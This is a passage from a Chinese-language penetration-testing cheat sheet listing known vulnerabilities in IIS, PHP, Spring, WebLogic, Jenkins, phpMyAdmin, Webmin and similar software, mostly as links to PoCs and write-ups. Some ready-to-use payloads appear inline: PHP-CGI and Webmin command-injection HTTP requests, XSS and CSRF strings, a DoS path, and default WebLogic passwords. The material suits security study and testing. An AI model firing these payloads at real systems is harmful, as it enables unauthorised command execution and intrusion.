    查询是否开启短文件名功能：fsutil 8dot3name query
    关闭该功能：fsutil 8dot3name set 1

    Windows Server 2003
    关闭该功能：fsutil behavior set disable8dot3 1
    ```

- POC | Payload | exp
    - [lijiejie/IIS_shortname_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner)
    - [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

**.Net Framework 拒绝服务攻击**

当请求文件夹名称包含 ~1 的请求,会导致不存在该文件的 .Net Framework 去递归查询所有根目录。如果只有一个“~1”是无效的,当“~1”大于一个,比如像这样：
`/wwwtest/fuck~1/~1/~1/~1.aspx`
此时文件系统会这样调用：
```
\wwwtest                           SUCCESS
\wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
\wwwtest\fuck~1                    NAME NOT FOUND
\wwwtest\fuck~1\~1\                PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
\wwwtest\fuck~1\~1                 PATH NOT FOUND
\wwwtest\fuck~1                    NAME NOT FOUND
\wwwtest                           SUCCESS
\wwwtest                           SUCCESS
```
如果我们请求的文件/文件夹名同时存在大小写时,这个请求会被请求两次,一次是原封不动的请求,一次是全部使用小写的请求。

下表显示了每个请求的 FS 调用的数量(Windows 2008 R2, IIS 7.5(latest patch – June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同))
![image](../../../../assets/img/安全/1.jpg)

**CVE-2017-7269** IIS6.0 RCE
- POC | Payload | exp
    - [zcgonvh/cve-2017-7269](https://github.com/zcgonvh/cve-2017-7269)
    - [zcgonvh/cve-2017-7269-tool](https://github.com/zcgonvh/cve-2017-7269-tool)
    - [lcatro/CVE-2017-7269-Echo-PoC](https://github.com/lcatro/CVE-2017-7269-Echo-PoC)
    - [edwardz246003/IIS_exploit](https://github.com/edwardz246003/IIS_exploit)

- MSF 模块

    - `use exploit/windows/iis/cve-2017-7269`

---

## JBOSS
**工具**
- [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss)

**未授权访问漏洞**

- `http://<ip>:8080/jmx-console`

## PHP
**CVE-2012-1823 PHPCGI 远程代码执行漏洞**
- 影响版本

    - php < 5.3.12 or php < 5.4.2

- 文章
    - [PHP-CGI远程代码执行漏洞 (CVE-2012-1823) 分析](https://paper.seebug.org/297/)

- POC | Payload | exp

    来源: https://vulhub.org/#/environments/php/CVE-2012-1823/

    `http://your-ip:8080/index.php?-s` 即爆出源码

    发送如下数据包,可见 Body 中的代码已被执行：
    ```
    POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
    Host: example.com
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 31

    <?php echo shell_exec("id"); ?>
    ```

**CVE-2018-19518 PHP imap 远程命令执行漏洞**
- 简介

    php imap 扩展用于在 PHP 中执行邮件收发操作。其 imap_open 函数会调用 rsh 来连接远程 shell,而 debian/ubuntu 中默认使用 ssh 来代替 rsh 的功能 (也就是说,在 debian 系列系统中,执行 rsh 命令实际执行的是 ssh 命令) 。

    因为 ssh 命令中可以通过设置 -oProxyCommand= 来调用第三方命令,攻击者通过注入注入这个参数,最终将导致命令执行漏洞。

- POC | Payload | exp
    - [PHP imap 远程命令执行漏洞 (CVE-2018-19518) ](https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/README.md)

**CVE-2019-11043 PHP-FPM 远程代码执行漏洞**
- 简介

    在长亭科技举办的 Real World CTF 中,国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现,向目标服务器 URL 发送 %0a 符号时,服务返回异常,疑似存在漏洞。

    在使用一些有错误的 Nginx 配置的情况下,通过恶意构造的数据包,即可让 PHP-FPM 执行任意代码。

- POC | Payload | exp
    - [PHP-FPM 远程代码执行漏洞 (CVE-2019-11043) ](https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md)
    - [neex/phuip-fpizdam](https://github.com/neex/phuip-fpizdam)

**LFI with phpinfo**
- 简介

    PHP 文件包含漏洞中,如果找不到可以包含的文件,我们可以通过包含临时文件的方法来 getshell。因为临时文件名是随机的,如果目标网站上存在 phpinfo,则可以通过 phpinfo 来获取临时文件名,进而进行包含。

- POC | Payload | exp
    - [PHP文件包含漏洞 (利用phpinfo) ](https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.md)
    - [LFI with phpinfo](https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo)

**PHP环境 XML外部实体注入漏洞 (XXE) **
- 简介

    libxml2.9.0 以后,默认不解析外部实体.

- POC | Payload | exp
    - [PHP环境 XML外部实体注入漏洞 (XXE) ](https://github.com/vulhub/vulhub/blob/master/php/php_xxe/README.md)

**XDebug 远程调试漏洞 (代码执行) **
- 简介

    XDebug是PHP的一个扩展,用于调试PHP代码。如果目标开启了远程调试模式,并设置remote_connect_back = 1：
    ```
    xdebug.remote_connect_back = 1
    xdebug.remote_enable = 1
    ```
    这个配置下,我们访问 http://target/index.php?XDEBUG_SESSION_START=phpstorm,目标服务器的 XDebug 将会连接访问者的 IP (或 X-Forwarded-For 头指定的地址) 并通过 dbgp 协议与其通信,我们通过 dbgp 中提供的 eval 方法即可在目标服务器上执行任意 PHP 代码。

- POC | Payload | exp
    - [XDebug 远程调试漏洞 (代码执行) ](https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/README.md)

---

## Resin
**文章**
- [针对Resin服务的攻击向量整理](https://blkstone.github.io/2017/10/30/resin-attack-vectors/)

**Resin 任意文件读取漏洞**
- 文章
    - [Resin任意文件读取漏洞](https://www.cnblogs.com/KevinGeorge/p/8953731.html)

---

## Spring
**CVE-2016-4977 Spring Security OAuth2 远程命令执行漏洞**
- 简介

    Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时,由于使用了Springs Expression Language (SpEL),攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。

- POC | Payload | exp

    来源: https://vulhub.org/#/environments/spring/CVE-2016-4977/

    - [vulhub/spring/CVE-2016-4977/poc.py](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py)

**CVE-2017-4971 Spring WebFlow 远程代码执行漏洞**
- 简介

    Spring WebFlow 是一个适用于开发基于流程的应用程序的框架 (如购物逻辑) ,可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中,如果我们控制了数据绑定时的field,将导致一个 SpEL 表达式注入漏洞,最终造成任意命令执行。

- 文章
    - [Spring WebFlow 远程代码执行漏洞 (CVE-2017-4971) ](https://vulhub.org/#/environments/spring/CVE-2017-4971/)

**CVE-2017-8046 Spring Data Rest 远程命令执行漏洞**
- 简介

    Spring Data REST 是一个构建在 Spring Data 之上,为了帮助开发者更加容易地开发 REST 风格的 Web 服务。在 REST API 的 Patch 方法中 (实现 RFC6902) ,path 的值被传入 setValue,导致执行了 SpEL 表达式,触发远程命令执行漏洞。

- 文章
    - [Spring Data Rest 远程命令执行漏洞 (CVE-2017-8046) ](https://vulhub.org/#/environments/spring/CVE-2017-8046/)

**CVE-2018-1270 Spring Messaging 远程命令执行漏洞**
- 简介

    spring messaging 为 spring 框架提供消息支持,其上层协议是 STOMP,底层通信基于 SockJS,

    在 spring messaging 中,其允许客户端订阅消息,并使用 selector 过滤消息。selector 用 SpEL 表达式编写,并使用 StandardEvaluationContext 解析,造成命令执行漏洞。

- 文章
    - [Spring Messaging 远程命令执行漏洞 (CVE-2018-1270) ](https://vulhub.org/#/environments/spring/CVE-2018-1270/)

**CVE-2018-1273 Spring Data Commons RCE 远程命令执行漏洞**
- 文章
    - [Spring Data Commons 远程命令执行漏洞 (CVE-2018-1273) ](https://vulhub.org/#/environments/spring/CVE-2018-1273/)

- POC | Payload | exp
    - [wearearima/poc-cve-2018-1273](https://github.com/wearearima/poc-cve-2018-1273)
    - [jas502n/cve-2018-1273](https://github.com/jas502n/cve-2018-1273)

---

## Weblogic
`老版本 weblogic 有一些常见的弱口令,比如 weblogic、system、portaladmin 和 guest,Oracle@123 等,用户名密码交叉使用。`

**工具**
- [dr0op/WeblogicScan](https://github.com/dr0op/WeblogicScan)
- [rabbitmask/WeblogicScan](https://github.com/rabbitmask/WeblogicScan)
- [rabbitmask/WeblogicScanLot](https://github.com/rabbitmask/WeblogicScanLot)

**环境搭建**
- [QAX-A-Team/WeblogicEnvironment](https://github.com/QAX-A-Team/WeblogicEnvironment)

**文章**
- [利用Weblogic进行入侵的一些总结](http://drops.xmd5.com/static/drops/tips-8321.html)
- [Weblogic JRMP反序列化漏洞回顾](https://xz.aliyun.com/t/2479)
- [Oracle WebLogic RCE反序列化漏洞分析](https://www.anquanke.com/post/id/162390)
- [【漏洞预警】WebLogic T3 反序列化绕过漏洞 & 附检测POC](https://www.secfree.com/a/957.html)
- [Weblogic 常见漏洞分析](https://hellohxk.com/blog/weblogic/)

**CVE-2009-1975**
- POC | Payload | exp
    - [Oracle WebLogic Server 10.3 - 'console-help.portal' Cross-Site Scripting](https://www.exploit-db.com/exploits/33079)

- 示例

    - `http://www.example.com:7011/consolehelp/console-help.portal?_nfpb=true&_pageLabel=ConsoleHelpSearchPage&searchQuery="><script>alert('DSECRG')</script> `

**CVE-2017-10271**
- 文章
    - [WebLogic XMLDecoder反序列化漏洞复现](https://mochazz.github.io/2017/12/25/weblogic_xmldecode/)
    - [blog-hugo/content/blog/Weblogic-0day.md](https://github.com/kylingit/blog-hugo/blob/master/content/blog/Weblogic-0day.md)

- 检测方法
    - `<目标IP:端口>/wls-wsat/CoordinatorPortType11`

- POC | Payload | exp
    - [1337g/CVE-2017-10271](https://github.com/1337g/CVE-2017-10271)

**CVE-2018-2628**
- 文章
    - [CVE-2018-2628 简单复现与分析 | xxlegend](http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/)

- POC | Payload | exp
    - [shengqi158/CVE-2018-2628](https://github.com/shengqi158/CVE-2018-2628)

**CVE-2018-2893**
- 文章
    - [天融信关于CVE-2018-2893 WebLogic反序列化漏洞分析](https://www.freebuf.com/column/178103.html)

- POC | Payload | exp
    - [pyn3rd/CVE-2018-2893](https://github.com/pyn3rd/CVE-2018-2893)

**CVE-2018-2894**
- 文章
    - [Weblogic CVE-2018-2894 漏洞复现](https://blog.csdn.net/qq_23936389/article/details/81256015)

- POC | Payload | exp
    - [LandGrey/CVE-2018-2894](https://github.com/LandGrey/CVE-2018-2894)

**CVE-2018-3191**
- 文章
    - [从流量侧浅谈WebLogic远程代码执行漏洞(CVE-2018-3191)](https://www.jianshu.com/p/f73b162c4649)

- POC | Payload | exp
    - [voidfyoo/CVE-2018-3191](https://github.com/voidfyoo/CVE-2018-3191)

**CVE-2018-3245**
- 文章
    - [weblogic反序列化漏洞 cve-2018-3245](https://blog.51cto.com/13770310/2308371)

- POC | Payload | exp
    - [pyn3rd/CVE-2018-3245](https://github.com/pyn3rd/CVE-2018-3245)

**CVE-2018-3246**
- 文章
    - [看我如何在Weblogic里捡一个XXE (CVE-2018-3246) ](https://www.freebuf.com/vuls/186862.html)

- POC | Payload | exp

    - [hackping/XXEpayload](https://github.com/hackping/XXEpayload/tree/master/xxe)
    - `http://127.0.0.1:8338/ws_utc/begin.do`

**CVE-2019-2725 && CNVD-C-2019-48814**
- 文章
    - [CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化RCE复现](https://www.jianshu.com/p/c4982a845f55)

- 检测方法
    ```bash
    <目标 IP:端口>/_async/AsyncResponseService
    <目标 IP:端口>/wls-wsat/CoordinatorPortType
    ```

- POC | Payload | exp
    - [MyTools/CVE-2019-2725](https://github.com/No4l/MyTools/tree/master/CVE-2019-2725)
    - [skytina/CNVD-C-2019-48814-COMMON](https://github.com/skytina/CNVD-C-2019-48814-COMMON)
    - [lufeirider/CVE-2019-2725](https://github.com/lufeirider/CVE-2019-2725)

---

# 组件
## 编辑器
**手册**
- [编辑器漏洞手册](https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/)

### ewebeditor
**文章**
- [ewebeditor 编辑器漏洞总结](https://www.0dayhack.com/post-426.html)

**常用路径**
```
Admin_Login.asp
Admin_Default.asp
Admin_Style.asp
Admin_UploadFile.asp
Upload.asp
Admin_ModiPwd.asp
eWebEditor.asp
db/ewebeditor.mdb
ewebeditor/login_admin.asp
eweb/login_admin.asp
editor/login_admin.asp
```

---

### FCKeditor
**文章**
- [Fckeditor上传漏洞利用拿shell总结](https://www.0dayhack.com/post-413.html)

**常用路径**
```
FCKeditor/_samples/default.html
FCKeditor/_whatsnew.html
fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.test.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php
FCKeditor/_samples/asp/sample01.asp
FCKeditor/_samples/asp/sample02.asp
FCKeditor/_samples/asp/sample03.asp
FCKeditor/_samples/asp/sample04.asp
```

---

### kindeditor
**kindeditor<=4.1.5 上传漏洞**
- 文章
    - [kindeditor<=4.1.5上传漏洞复现](https://www.cnblogs.com/backlion/p/10421405.html)

- 漏洞修复
    1. 直接删除 `upload_json.*` 和 `file_manager_json.*`
    2. 升级 kindeditor 到最新版本

---

## 序列化
### fastjson
**fastjson-1.2.22 到 fastjson-1.2.24 反序列化导致任意命令执行漏洞**
- POC | Payload | exp
    - [fastjson 反序列化导致任意命令执行漏洞](https://vulhub.org/#/environments/fastjson/vuln/)

---

## 其他
### webuploader
**webuploader-v-0.1.15 组件存在文件上传漏洞(未授权)**
- POC | Payload | exp
    - [jas502n/webuploader-0.1.15-Demo](https://github.com/jas502n/webuploader-0.1.15-Demo#webuploader-v-0115-%E7%BB%84%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%9C%AA%E6%8E%88%E6%9D%83)

---

# 服务
## Aria2
**Aria2 任意文件写入漏洞**

- 简述

    Aria2 是一个命令行下轻量级、多协议、多来源的下载工具 (支持 HTTP/HTTPS、FTP、BitTorrent、Metalink) ,内建 XML-RPC 和 JSON-RPC 接口。在有权限的情况下,我们可以使用 RPC 接口来操作 aria2 来下载文件,将文件下载至任意目录,造成一个任意文件写入漏洞。

- 文章
    - [Aria2 任意文件写入漏洞](https://github.com/vulhub/vulhub/blob/master/aria2/rce/README.zh-cn.md)

---

## Jenkins
**资源**
- [gquere/pwn_jenkins: Notes about attacking Jenkins servers](https://github.com/gquere/pwn_jenkins)
- [petercunha/jenkins-rce](https://github.com/petercunha/jenkins-rce)
- [Hacking Jenkins Part 1 - Play with Dynamic Routing](https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/)
- [Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/)

**CVE-2017-1000353**
- POC | Payload | exp
    - [vulhub/CVE-2017-1000353](https://github.com/vulhub/CVE-2017-1000353)

**CVE-2018-1000861**
- 简述

    Jenkins 使用 Stapler 框架开发,其允许用户通过 URL PATH 来调用一次 public 方法。由于这个过程没有做限制,攻击者可以构造一些特殊的 PATH 来执行一些敏感的 Java 方法。

    通过这个漏洞,我们可以找到很多可供利用的利用链。其中最严重的就是绕过 Groovy 沙盒导致未授权用户可执行任意命令：Jenkins 在沙盒中执行 Groovy 前会先检查脚本是否有错误,检查操作是没有沙盒的,攻击者可以通过 Meta-Programming 的方式,在检查这个步骤时执行任意命令。

- POC | Payload | exp
    - [orangetw/awesome-jenkins-rce-2019](https://github.com/orangetw/awesome-jenkins-rce-2019)

**CVE-2018-1999001**
- 文章
    - [Jenkins配置文件路径改动导致管理员权限开放漏洞(CVE-2018-1999001) ](https://mp.weixin.qq.com/s/O_Ni4Xlsi4uHRcyv3SeY5g)

**CVE-2018-1999002**
- 文章
    - [安全研究 | Jenkins 任意文件读取漏洞分析](https://bbs.ichunqiu.com/thread-43283-1-1.html)

**cve-2019-1003000**
- 文章
    - [Jenkins未授权访问RCE漏洞复现记录 | angelwhu_blog](https://www.angelwhu.com/blog/?p=539)
    - [Jenkins RCE CVE-2019-1003000 漏洞复现](https://blog.51cto.com/13770310/2352740)

- POC | Payload | exp
    - [adamyordan/cve-2019-1003000-jenkins-rce-poc: Jenkins RCE Proof-of-Concept: SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc)

**CVE-2019-10320**
- 文章
    - [Exploring the File System via Jenkins Credentials Plugin Vulnerability – CVE-2019-10320 | Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/2019/05/23/exploring-the-file-system-via-jenkins-credentials-plugin-vulnerability-cve-2019-10320/)

---

## Jira
**CVE-2019-8451 Jira 未授权 SSRF 漏洞**
- 影响范围

    - < 8.4.0

- POC | Payload | exp
    - [jas502n/CVE-2019-8451](https://github.com/jas502n/CVE-2019-8451)

**CVE-2019-11581 Atlassian Jira 模板注入漏洞**
- 影响范围
    - 4.4.x
    - 5.x.x
    - 6.x.x
    - 7.0.x
    - 7.1.x
    - 7.2.x
    - 7.3.x
    - 7.4.x
    - 7.5.x
    - 7.6.x before 7.6.14 (the fixed version for 7.6.x)
    - 7.7.x
    - 7.8.x
    - 7.9.x
    - 7.10.x
    - 7.11.x
    - 7.12.x
    - 7.13.x before 7.13.5 (the fixed version for 7.13.x)
    - 8.0.x before 8.0.3 (the fixed version for 8.0.x)
    - 8.1.x before 8.1.2 (the fixed version for 8.1.x)
    - 8.2.x before 8.2.3 (the fixed version for 8.2.x)

- 文章
    - [Atlassian Jira 模板注入漏洞 (CVE-2019-11581) ](https://vulhub.org/#/environments/jira/CVE-2019-11581/)

---

## Nexus
**CVE-2019-7238 Nexus Repository Manager 3 Remote Code Execution without authentication < 3.15.0**
- 简述

    Nexus Repository Manager 3 是一款软件仓库,可以用来存储和分发 Maven、NuGET 等软件源仓库。其 3.14.0 及之前版本中,存在一处基于 OrientDB 自定义函数的任意 JEXL 表达式执行功能,而这处功能存在未授权访问漏洞,将可以导致任意命令执行漏洞。

- 文章
    - [一次偶遇Nexus](https://www.secpulse.com/archives/111818.html)
    - [Nexus Repository Manager 3 远程命令执行漏洞 (CVE-2019-7238) ](https://vulhub.org/#/environments/nexus/CVE-2019-7238/)

- POC | Payload | exp
    - [mpgn/CVE-2019-7238](https://github.com/mpgn/CVE-2019-7238)
    - [jas502n/CVE-2019-7238](https://github.com/jas502n/CVE-2019-7238)

---

## noVNC
**CVE-2017-18635 xss**
- 文章
    - [Exploiting an old noVNC XSS (CVE-2017-18635) in OpenStack](https://www.shielder.it/blog/exploiting-an-old-novnc-xss-cve-2017-18635-in-openstack/)

- POC | Payload | exp
    - [ShielderSec/cve-2017-18635](https://github.com/ShielderSec/cve-2017-18635)

---

## phpMyAdmin

- 官网: https://www.phpmyadmin.net/

**文章**
- [phpMyadmin各版本漏洞](https://www.cnblogs.com/xishaonian/p/7627125.html) - 2/3 老版本的漏洞

**CVE-2016-5734 4.0.x—4.6.2 远程代码执行漏洞**
- POC | Payload | exp
    - [phpMyAdmin 4.6.2 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/40185)

**LOAD DATA INFILE 任意文件读取漏洞**
- POC | Payload | exp
    [Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)
    ```vim
    vim rogue_mysql_server.py

    PORT = 3307
    ```
    `python rogue_mysql_server.py`

    打开目标 phpMyAdmin 的登录页面,地址输入 db:3307、用户名、密码,提交登录。

    回到db的终端,如果文件读取成功会将文件内容记录到 mysql.log 文件中

**phpMyAdmin 4.7.x CSRF**
- 文章
    - [phpMyAdmin 4.7.x CSRF 漏洞利用](http://blog.vulnspy.com/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/)

**4.8.x 本地文件包含漏洞利用**
- 文章
    - [phpMyAdmin 4.8.x 本地文件包含漏洞利用 | Vulnspy Blog](http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/) 可以通过这个线上靶场实验,不过 docker 镜像可能有点问题,mysql 进程起不起来,我的解决方式是直接卸了重装 mysql-server,而且他默认的 apt 源无法访问,还要换一下 apt 源

**phpmyadmin4.8.1 后台 getshell**
- 文章
    - [phpmyadmin4.8.1后台getshell](https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog)

**CVE-2019-12922 & 4.9.0.1 CSRF**
- POC | Payload | exp

    - `<img src=" http://server/phpmyadmin/setup/index.php?page=servers&mode=remove&id=1" style="display:none;" />`
    - https://www.hedysx.com/bug/2398.html

---

## Supervisord
**测试链接**
- `http://<ip>:9001`

**CVE-2017-11610 Supervisord 远程命令执行漏洞**
- 文章
    - [Supervisord远程命令执行漏洞 (CVE-2017-11610) ](https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html)
    - [Supervisord 远程命令执行漏洞 (CVE-2017-11610) ](https://vulhub.org/#/environments/supervisor/CVE-2017-11610/)

---

## Webmin
**CVE-2019-15107**
- 影响范围
    - 1.890 through 1.920

- 详情
    - 在其找回密码页面中,存在一处无需权限的命令注入漏洞,通过这个漏洞攻击者即可以执行任意系统命令。

- 文章
    - [Webmin(CVE-2019-15107) 远程代码执行漏洞之 backdoor 探究](https://zhuanlan.zhihu.com/p/79287037)

- POC | Payload | exp
    - [vulhub/webmin/CVE-2019-15107/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/webmin/CVE-2019-15107/README.zh-cn.md)
    ```
    POST /password_change.cgi HTTP/1.1
    Host: your-ip:10000
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Cookie: redirect=1; testing=1; sid=x; sessiontest=1
    Referer: https://your-ip:10000/session_login.cgi
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 60

    user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
    ```

**CVE-2019-15642 Webmin Remote Code Execution**
- 影响范围
    - 1.900 through 1.920

- POC | Payload | exp
    - [jas502n/CVE-2019-15642](https://github.com/jas502n/CVE-2019-15642)

---

## zabbix

zabbix 是一款服务器监控软件,其由 server、agent、web 等模块组成,其中 web 模块由 PHP 编写,用来显示数据库中的结果。

**CVE-2016-10134 zabbix latest.php SQL 注入漏洞**
- 文章
    - [zabbix latest.php SQL注入漏洞 (CVE-2016-10134) ](https://vulhub.org/#/environments/zabbix/CVE-2016-10134/)
